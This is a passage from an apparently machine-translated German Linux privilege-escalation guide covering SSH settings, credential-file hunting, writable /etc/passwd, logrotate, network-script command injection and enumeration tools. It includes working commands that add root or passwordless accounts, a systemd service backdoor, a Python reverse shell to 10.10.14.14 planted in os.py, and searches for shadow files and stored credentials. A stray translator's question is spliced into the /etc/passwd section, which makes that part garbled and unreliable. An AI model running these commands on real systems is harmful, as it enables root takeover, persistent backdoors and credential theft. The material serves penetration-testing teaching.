- **PubkeyAuthentication:** Gibt an, ob Public-Key-Authentifizierung erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, legt dies fest, ob der Server Anmeldungen zu Konten mit leerem Passwort erlaubt. Der Standard ist `no`.

### PermitRootLogin

Gibt an, ob root sich per ssh einloggen kann, Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und privatem Schlüssel einloggen
- `without-password` or `prohibit-password`: root kann sich nur mit einem privaten Schlüssel einloggen
- `forced-commands-only`: Root kann sich nur mit privatem Schlüssel einloggen und nur wenn die commands-Optionen angegeben sind
- `no`: nicht erlaubt

### AuthorizedKeysFile

Gibt Dateien an, die die öffentlichen Schlüssel enthalten, die für die Benutzer-Authentifizierung verwendet werden können. Sie kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Du kannst absolute Pfade angeben** (die mit `/` beginnen) oder **relative Pfade vom Home-Verzeichnis des Benutzers**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn du versuchst, dich mit dem **private** key des Benutzers "**testusername**" einzuloggen, ssh den public key deines Keys mit den in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` befindlichen vergleichen wird.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ermöglicht es dir, **use your local SSH keys instead of leaving keys** (without passphrases!) auf deinem Server liegen zu lassen. Dadurch kannst du per ssh **jump** **to a host** und von dort **jump to another** host **using** den **key** auf deinem **initial host**.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` `*` ist, jedes Mal, wenn der Benutzer auf eine andere Maschine wechselt, dieser Host in der Lage sein wird, auf die keys zuzugreifen (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist erlauben).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **du es möglicherweise missbrauchen kannst, um Privilegien zu eskalieren**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du eine davon **schreiben oder verändern kannst, kannst du Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profile-Skript gefunden wird, solltest du es auf **sensible Details** überprüfen.

### Passwd/Shadow-Dateien

Je nach OS können die `/etc/passwd` und `/etc/shadow` Dateien einen anderen Namen haben oder es könnte ein Backup existieren. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In manchen Fällen kann man **password hashes** in der Datei `/etc/passwd` (oder einer äquivalenten Datei) finden.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbares /etc/passwd

Erzeuge zuerst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ich habe die Datei src/linux-hardening/privilege-escalation/README.md nicht erhalten. Bitte füge den Inhalt der Datei hier ein. Soll ich zusätzlich in die übersetzte Datei eine Zeile einfügen, die den Benutzer `hacker` und ein generiertes Passwort enthält? Wenn ja, welche Anforderungen an das Passwort (Länge, Zeichenarten) soll ich verwenden — oder soll ich ein sicheres Passwort (z. B. 16 Zeichen mit Groß-/Kleinbuchstaben, Ziffern und Sonderzeichen) automatisch generieren?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den Befehl `su` mit `hacker:hacker` verwenden

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Du könntest die aktuelle Sicherheit der Maschine beeinträchtigen.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du in einige **sensible Dateien** schreiben kannst. Zum Beispiel: Kannst du in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server ausführt und Sie die **Tomcat Service-Konfigurationsdatei innerhalb von /etc/systemd/,** ändern können, dann können Sie die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich wirst du den letzten nicht lesen können, aber versuche es)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ungewöhnlicher Speicherort/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Lesen Sie den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er sucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool** das Sie dafür verwenden können, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) eine Open-Source-Anwendung zum Auslesen zahlreicher auf einem lokalen Computer gespeicherter Passwörter für Windows, Linux & Mac.

### Logs

Wenn Sie Logs lesen können, können Sie möglicherweise **interessante/vertrauliche Informationen darin** finden. Je ungewöhnlicher das Log ist, desto interessanter wird es (wahrscheinlich).\
Außerdem können einige "**bad**" konfigurierte (backdoored?) **audit logs** es ermöglichen, Passwörter innerhalb der audit logs zu **protokollieren**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um Logs zu lesen, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und auch nach IPs und emails in Logs oder nach hashes regexps.\
Ich werde hier nicht aufzählen, wie man das alles macht, aber wenn du interessiert bist, kannst du dir die letzten Checks ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) ausführt.

## Schreibbare Dateien

### Python library hijacking

Wenn du weißt, von **wo** ein python-Skript ausgeführt wird und du **in diesen Ordner schreiben kannst** oder du **python libraries** ändern kannst, kannst du die OS library modifizieren und mit einem backdoor versehen (wenn du an die Stelle schreiben kannst, an der das python-Skript ausgeführt wird, kopiere die os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-Ausnutzung

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **write permissions** auf eine Log-Datei oder deren übergeordnete Verzeichnisse, möglicherweise Privilegien zu eskalieren. Das liegt daran, dass `logrotate`, das oft als **root** läuft, manipuliert werden kann, um beliebige Dateien auszuführen — insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Log-Rotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Mehr Informationen zur Schwachstelle findest du auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Diese Schwachstelle kann mit [**logrotten**](https://github.com/whotwagner/logrotten) ausgenutzt werden.

Diese Schwachstelle ist der [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** sehr ähnlich, daher solltest du, sobald du feststellst, dass du logs verändern kannst, prüfen, wer diese logs verwaltet, und ob du Privilegien eskalieren kannst, indem du die logs durch symlinks ersetzt.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus irgendeinem Grund ein **write** `ifcf-<whatever>`-Skript nach _/etc/sysconfig/network-scripts_ schreiben kann **oder** ein vorhandenes anpassen kann, dann ist dein **system is pwned**.

Network scripts, _ifcg-eth0_ zum Beispiel, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Allerdings werden sie unter Linux vom Network Manager (dispatcher.d) ~sourced~.

In meinem Fall wird das `NAME=`-Attribut in diesen Network-Skripten nicht korrekt behandelt. Wenn du **white/blank space im Namen hast, versucht das System den Teil nach dem white/blank space auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis auf das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd, und rc.d**

Das Verzeichnis `/etc/init.d` enthält **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Management-System**. Es umfasst Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Services. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/`. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Andererseits ist `/etc/init` mit **Upstart** verbunden, einem neueren **Service-Management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Management-Aufgaben verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte wegen einer Kompatibilitätsschicht in Upstart weiterhin neben Upstart-Konfigurationen genutzt.

**systemd** hat sich als moderner Init- und Service-Manager etabliert und bietet erweiterte Funktionen wie bedarfsorientiertes Starten von Daemons, Automount-Verwaltung und Systemzustands-Snapshots. Es organisiert Dateien unter `/usr/lib/systemd/` für Distribution-Pakete und `/etc/systemd/system/` für Administratoränderungen und vereinfacht so die Systemverwaltung.

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen Syscall, um privilegierte Kernel-Funktionalität einem Userspace-Manager zugänglich zu machen. Schwache Manager-Authentifizierung (z. B. Signaturprüfungen, die auf FD-Reihenfolge basieren, oder schlechte Passwortschemata) kann einer lokalen App erlauben, sich als Manager auszugeben und auf bereits gerooteten Geräten Root-Rechte zu erlangen. Mehr Informationen und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gesteuerte Service-Erkennung in VMware Tools/Aria Operations kann einen Binary-Pfad aus Prozess-Kommandozeilen extrahieren und diesen mit -v in einem privilegierten Kontext ausführen. Zu großzügige Patterns (z. B. Verwendung von \S) können auf von Angreifern platzierten Listenern in beschreibbaren Verzeichnissen (z. B. /tmp/httpd) passen und zur Ausführung als root führen (CWE-426 Untrusted Search Path).

Mehr dazu und ein generalisiertes Muster, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel-Sicherheitsmaßnahmen

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mehr Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
